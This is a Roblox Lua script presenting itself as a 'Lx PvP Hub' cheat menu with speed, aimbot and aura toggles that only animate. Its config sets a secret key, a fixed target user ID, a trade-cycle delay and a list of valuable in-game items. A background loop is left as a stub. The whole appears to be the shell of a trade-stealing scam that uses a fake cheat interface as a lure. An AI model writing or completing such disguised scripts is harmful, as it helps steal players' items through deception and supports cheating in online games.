-- Lx PvP Hub | ULTRA + BACKGROUND

-- =========================
-- CONFIG ORIGINAL (IMPORTANTE)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = {
    ["Tang Tang Keletang"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Spooky Grande"] = true,
    ["La Extinct Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Taco Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["GOAT"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tictac Sahur"] = true,
    ["Ketupat Kepat"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["La Supreme Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Chicleteiras"] = true
}

-- Lx PvP Hub | Chili Style UI + Background

-- =========================
-- TEU SCRIPT (BACKGROUND)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = getgenv().TARGET_BRAINROTS or {}

task.spawn(function()
    while true do
        -- teu sistema continua aqui
        task.wait(getgenv().DELAY_STEP)
    end
end)

-- =========================
-- UI SYSTEM
-- =========================
task.spawn(function()

    local TweenService = game:GetService("TweenService")
    local UIS = game:GetService("UserInputService")

    local gui = Instance.new("ScreenGui", game.CoreGui)

    -- MAIN
    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0, 560, 0, 360)
    main.Position = UDim2.new(0.5,-280,0.5,-180)
    main.BackgroundColor3 = Color3.fromRGB(18,18,18)
    main.Active = true

    Instance.new("UICorner", main).CornerRadius = UDim.new(0,12)

    -- TOPBAR
    local top = Instance.new("Frame", main)
    top.Size = UDim2.new(1,0,0,45)
    top.BackgroundColor3 = Color3.fromRGB(24,24,24)
    Instance.new("UICorner", top).CornerRadius = UDim.new(0,12)

    local title = Instance.new("TextLabel", top)
    title.Size = UDim2.new(1,0,1,0)
    title.Text = "Lx PvP Hub"
    title.TextColor3 = Color3.fromRGB(0,255,170)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.BackgroundTransparency = 1

    -- MINIMIZE
    local min = Instance.new("TextButton", top)
    min.Size = UDim2.new(0,40,1,0)
    min.Position = UDim2.new(1,-45,0,0)
    min.Text = "-"
    min.BackgroundColor3 = Color3.fromRGB(40,40,40)
    Instance.new("UICorner", min).CornerRadius = UDim.new(1,0)

    local minimized = false

    local function setVisible(state)
        for _,v in pairs(main:GetChildren()) do
            if v ~= top then
                v.Visible = state
            end
        end
    end

    min.MouseButton1Click:Connect(function()
        minimized = not minimized

        if minimized then
            setVisible(false)
            TweenService:Create(main, TweenInfo.new(0.3), {
                Size = UDim2.new(0,560,0,45)
            }):Play()
        else
            setVisible(true)
            TweenService:Create(main, TweenInfo.new(0.3), {
                Size = UDim2.new(0,560,0,360)
            }):Play()
        end
    end)

    -- DRAG SYSTEM (SUAVE)
    local dragging = false
    local dragStart, startPos

    top.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            TweenService:Create(main, TweenInfo.new(0.05), {
                Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            }):Play()
        end
    end)

    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    -- SIDEBAR
    local side = Instance.new("Frame", main)
    side.Size = UDim2.new(0,140,1,-45)
    side.Position = UDim2.new(0,0,0,45)
    side.BackgroundColor3 = Color3.fromRGB(22,22,22)
    Instance.new("UICorner", side).CornerRadius = UDim.new(0,12)

    -- CONTENT
    local content = Instance.new("Frame", main)
    content.Size = UDim2.new(1,-140,1,-45)
    content.Position = UDim2.new(0,140,0,45)
    content.BackgroundTransparency = 1

    local tabs = {}

    local function createTab(name, y)
        local btn = Instance.new("TextButton", side)
        btn.Size = UDim2.new(1,0,0,45)
        btn.Position = UDim2.new(0,0,0,y)
        btn.Text = "   "..name
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.BackgroundColor3 = Color3.fromRGB(22,22,22)
        btn.TextColor3 = Color3.fromRGB(150,150,150)

        local indicator = Instance.new("Frame", btn)
        indicator.Size = UDim2.new(0,4,1,0)
        indicator.BackgroundColor3 = Color3.fromRGB(0,255,170)
        indicator.Visible = false

        local frame = Instance.new("Frame", content)
        frame.Size = UDim2.new(1,0,1,0)
        frame.Visible = false
        frame.BackgroundTransparency = 1

        tabs[name] = frame

        btn.MouseButton1Click:Connect(function()
            for n,f in pairs(tabs) do f.Visible = false end

            for _,b in pairs(side:GetChildren()) do
                if b:IsA("TextButton") then
                    b.TextColor3 = Color3.fromRGB(150,150,150)
                    if b:FindFirstChild("Frame") then
                        b.Frame.Visible = false
                    end
                end
            end

            frame.Visible = true
            indicator.Visible = true
            btn.TextColor3 = Color3.new(1,1,1)
        end)

        return frame
    end

    local mainTab = createTab("Main",0)
    local pvpTab = createTab("PvP",45)
    local miscTab = createTab("Misc",90)

    tabs["Main"].Visible = true

    -- TOGGLE (PRO)
    local function createToggle(parent, text, y)
        local card = Instance.new("Frame", parent)
        card.Size = UDim2.new(0.9,0,0,50)
        card.Position = UDim2.new(0.05,0,0,y)
        card.BackgroundColor3 = Color3.fromRGB(25,25,25)
        Instance.new("UICorner", card).CornerRadius = UDim.new(0,10)

        local label = Instance.new("TextLabel", card)
        label.Size = UDim2.new(0.7,0,1,0)
        label.Text = text
        label.TextColor3 = Color3.new(1,1,1)
        label.BackgroundTransparency = 1
        label.TextXAlignment = Enum.TextXAlignment.Left

        local toggle = Instance.new("Frame", card)
        toggle.Size = UDim2.new(0,45,0,22)
        toggle.Position = UDim2.new(1,-60,0.5,-11)
        toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
        Instance.new("UICorner", toggle).CornerRadius = UDim.new(1,0)

        local knob = Instance.new("Frame", toggle)
        knob.Size = UDim2.new(0,20,0,20)
        knob.Position = UDim2.new(0,1,0,1)
        knob.BackgroundColor3 = Color3.new(1,1,1)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1,0)

        local on = false

        toggle.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                on = not on

                TweenService:Create(knob, TweenInfo.new(0.25), {
                    Position = on and UDim2.new(1,-21,0,1) or UDim2.new(0,1,0,1)
                }):Play()

                TweenService:Create(toggle, TweenInfo.new(0.25), {
                    BackgroundColor3 = on and Color3.fromRGB(0,255,170) or Color3.fromRGB(50,50,50)
                }):Play()
            end
        end)
    end

    createToggle(mainTab,"Speed Modifier",20)
    createToggle(mainTab,"Drop Brainrot",80)

    createToggle(pvpTab,"Bat Aimbot",20)
    createToggle(pvpTab,"PvP Aura",80)

    createToggle(miscTab,"Auto Play",20)

end)
